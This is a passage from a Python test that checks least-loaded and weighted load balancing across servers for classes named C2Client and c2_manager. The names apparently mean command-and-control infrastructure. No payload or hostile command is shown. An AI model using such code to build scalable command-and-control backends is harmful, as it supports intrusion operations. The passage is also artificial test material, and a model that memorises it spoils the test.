            assert assigned['id'] == least_loaded, "Should assign to least loaded server"
            
            # Test weighted distribution
            weights = {server_ids[0]: 3, server_ids[1]: 2, server_ids[2]: 1}
            load_balancer.set_algorithm('weighted')
            load_balancer.set_weights(weights)
            
            # Create many clients and check distribution matches weights
            weighted_clients = []
            for i in range(60):
                client = C2Client()
                assigned = load_balancer.get_server_assignment()
                client.connect(assigned['host'], assigned['port'])
                weighted_clients.append((client, assigned['id']))
            
            # Count assignments
            weighted_distribution = {}
            for _, server_id in weighted_clients:
                weighted_distribution[server_id] = weighted_distribution.get(server_id, 0) + 1
            
            # Verify weighted distribution (with some tolerance)
            total = sum(weighted_distribution.values())
            for server_id, weight in weights.items():
                expected_ratio = weight / sum(weights.values())
                actual_ratio = weighted_distribution.get(server_id, 0) / total
                assert abs(expected_ratio - actual_ratio) < 0.15, \
                       f"Weighted distribution should match for {server_id}"
            
            # Cleanup
            for client in clients + [c for c, _ in weighted_clients]:
                try:
                    client.disconnect()
                except:
                    pass
                    
        finally:
            for server_id in server_ids:
                c2_manager.shutdown_server(server_id)